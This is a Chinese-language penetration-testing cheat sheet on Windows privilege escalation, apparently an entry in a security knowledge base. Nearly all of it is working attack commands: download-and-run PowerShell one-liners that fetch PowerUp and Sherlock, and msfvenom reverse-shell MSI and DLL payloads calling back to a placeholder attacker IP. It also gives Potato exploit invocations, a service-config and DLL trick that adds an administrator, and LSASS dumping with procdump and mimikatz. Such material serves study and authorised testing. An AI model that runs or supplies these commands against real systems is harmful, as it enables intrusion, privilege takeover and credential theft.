---
id: 04-002
title: "🪟 Windows权限提升 (Windows Privilege Escalation)"
category: 权限提升
category_en: "Privilege Escalation"
difficulty: ★★★
tools: "WinPEAS, PowerUp, PrivescCheck, Seatbelt"
last_updated: 2025-07
tags: ["privilege-escalation", "linux-privilege", "windows-privilege", "credential-theft"]
subdomain: privilege-escalation
nist_csf: ["PR.AC-01", "DE.CM-04"]
mitre_attack: ["T1068", "T1548", "T1055", "T1003"]
---
# 🪟 Windows权限提升 (Windows Privilege Escalation)

## 概述
Windows系统中的权限提升技术，利用内核漏洞、服务漏洞、令牌窃取、注册表配置错误等方式从普通用户提升到SYSTEM或管理员权限。

## 核心技能

### 1. 信息收集与枚举

```powershell
# 系统信息
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
wmic os get Caption,Version,OSArchitecture
hostname
ver

# 用户信息
whoami
whoami /all                    # 所有令牌信息
whoami /groups                 # 用户组
whoami /priv                   # 当前权限
net user
net user %USERNAME%
net localgroup administrators
net localgroup "Remote Desktop Users"

# 补丁信息
wmic qfe get Caption,Description,HotFixID,InstalledOn
systeminfo | findstr /C:"KB"

# 自动化枚举
# PowerUp - PowerSploit模块
powershell -Exec Bypass -C "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks"

# WinPEAS
# 上传后运行
winpeas.exe

# Sherlock
powershell -Exec Bypass -C "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1'); Find-AllVulns"

# Seatbelt
seatbelt.exe -group=all
```

### 2. 内核漏洞提权

```powershell
# 常见Windows内核漏洞
# MS16-032 - Secondary Logon Handle
# MS17-010 - EternalBlue
# MS18-8120 - Win32k Elevation
# CVE-2021-1732 - Win32k Elevation
# CVE-2021-26868 - Windows Graphics
# CVE-2022-21882 - Win32k Elevation
# CVE-2023-21768 - AFD Driver

# 使用Metasploit本地提权模块
meterpreter > run post/multi/recon/local_exploit_suggester
meterpreter > use exploit/windows/local/ms16_075_reflection
meterpreter > use exploit/windows/local/cve_2021_1732_win32k

# 使用Windows Exploit Suggester
# 在攻击机上运行（基于systeminfo输出）
systeminfo > systeminfo.txt
python windows-exploit-suggester.py --update
python windows-exploit-suggester.py --database 2024-XX-XX-mssb.xlsx --systeminfo systeminfo.txt

# PrintNightmare (CVE-2021-1675 / CVE-2021-34527)
# 利用打印后台处理程序
git clone https://github.com/cube0x0/CVE-2021-1675.git
# MSF模块: exploit/windows/printnightmare

# Potato家族提权
# JuicyPotato - SeImpersonatePrivilege
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t *

# RoguePotato
RoguePotato.exe -r YOUR_IP -l 9999 -e cmd.exe

# GodPotato (Windows Server 2019/2022)
GodPotato.exe -cmd "cmd /c whoami"
```

### 3. 服务漏洞利用

```powershell
# 可写服务路径（Unquoted Service Path）
# 查找服务路径中带空格的未加引号服务
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows" | findstr /i /v """

# 手工检查
sc qc ServiceName
# 如果路径类似: C:\Program Files\My App\service.exe
# 可创建: C:\Program.exe 或 C:\Program Files\My.exe

# 可写服务二进制文件
# 找到服务路径并检查是否可写
icacls "C:\Path\To\Service.exe"
# 如果BUILTIN\Users有(F)或(M)权限，则可用恶意程序替换

# 服务权限配置错误
# 使用accesschk
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv "Users" * *

# 如果服务有SERVICE_CHANGE_CONFIG权限
sc config ServiceName binpath="cmd.exe /c net localgroup administrators user /add"
sc stop ServiceName
sc start ServiceName

# PowerUp服务模块
powershell -Exec Bypass -C "IEX(New-Object Net.WebClient).DownloadString('...PowerUp.ps1'); Get-ModifiableServiceFile | Invoke-ServiceAbuse"
```

### 4. AlwaysInstallElevated提权

```powershell
# 检查注册表
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# 如果两个都是1，则普通用户可以安装提升权限的MSI

# 生成恶意MSI
# 使用msfvenom
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f msi -o malicious.msi

# 或使用PowerUp生成
Write-UserAddMSI

# 安装恶意MSI
msiexec /quiet /qn /i malicious.msi
```

### 5. 凭证窃取与令牌操纵

```powershell
# 查看特权
whoami /priv

# SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege
# 使用PrintSpoofer/RoguePotato等提权

# SeBackupPrivilege
# 备份SAM和SYSTEM注册表
reg save hklm\sam sam
reg save hklm\system system
# 然后使用impacket-secretsdump提取哈希

# SeDebugPrivilege - 进程注入
# 使用Procdump转储LSASS
procdump.exe -accepteula -ma lsass.exe lsass.dmp
# 或使用Mimikatz
mimikatz.exe privilege::debug sekurlsa::logonpasswords exit

# 凭证管理器
cmdkey /list
# 如果保存了凭证，可用runas使用
runas /savecred /user:DOMAIN\Administrator "cmd.exe /c whoami"

# 查找密码文件
findstr /si "password" *.txt *.xml *.ini *.config
dir /s *pass* *cred* *vnc* *.config*
```

### 6. 注册表配置错误

```powershell
# AutoRun
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

# 注册表键权限（关键路径）
# 检查以下路径是否有当前用户的写权限
# HKLM\SYSTEM\CurrentControlSet\Services\某个服务
# HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# 计划任务
schtasks /query /fo LIST /v | findstr /i "task" 
# 查看引用的程序路径是否可写

# Startup文件夹
# 检查是否有写入权限
dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
dir "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
```

### 7. DLL劫持

```powershell
# 确认可写目录
# 找到缺少的DLL（使用Process Monitor或Procmon）

# 检查服务/程序是否从可写目录加载DLL
# 使用Process Monitor过滤:
# 1. Path 包含 .dll
# 2. Result 为 NAME NOT FOUND

# 生成恶意DLL
# 使用msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f dll -o malicious.dll

# 使用c++生成DLL
# dllmain.cpp:
# #include <windows.h>
# BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
#     if (reason == DLL_PROCESS_ATTACH) {
#         system("cmd.exe /c net localgroup administrators user /add");
#     }
#     return TRUE;
# }

# 编译: x86_64-w64-mingw32-gcc -shared -o exploit.dll dllmain.cpp
```

## 权限提升检查清单

| 检查项 | 命令/方法 |
|:---|:---|
| 系统信息 | `systeminfo` |
| 已安装补丁 | `wmic qfe get Caption,HotFixID` |
| 用户权限 | `whoami /all` / `whoami /priv` |
| 服务权限 | `accesschk.exe /accepteula -uwcqv "Users" *` |
| 服务路径 | `wmic service get name,pathname` |
| AlwaysInstallElevated | 注册表检查 |
| 凭证 | `cmdkey /list` |
| 计划任务 | `schtasks /query /fo LIST /v` |
| 启动项 | `wmic startup get caption,command` |
| 可写目录 | `icacls C:\Program Files\*` |

## 常用工具

| 工具 | 用途 | 链接 |
|:---|:---|:---|
| WinPEAS | Windows提权枚举 | https://github.com/carlospolop/PEASS-ng |
| PowerUp | PowerSploit提权 | https://github.com/PowerShellMafia/PowerSploit |
| Sherlock | 漏洞检测 | https://github.com/rasta-mouse/Sherlock |
| Windows Exploit Suggester | 补丁对比 | https://github.com/AonCyberLabs/Windows-Exploit-Suggester |
| JuicyPotato | Potato提权 | https://github.com/ohpe/juicy-potato |
| PrintSpoofer | 打印假脱机提权 | https://github.com/itm4n/PrintSpoofer |
| Seatbelt | 安全枚举 | https://github.com/GhostPack/Seatbelt |
| Lazagne | 密码提取 | https://github.com/AlessandroZ/LaZagne |

## 参考资源
- [HackTricks - Windows Privesc](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- [FuzzySecurity - Windows Privilege Escalation](https://fuzzysecurity.com/tutorials/16.html)
- [PayloadsAllTheThings - Windows Privesc](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation)
- [LOLBAS - Windows二进制利用](https://lolbas-project.github.io/)
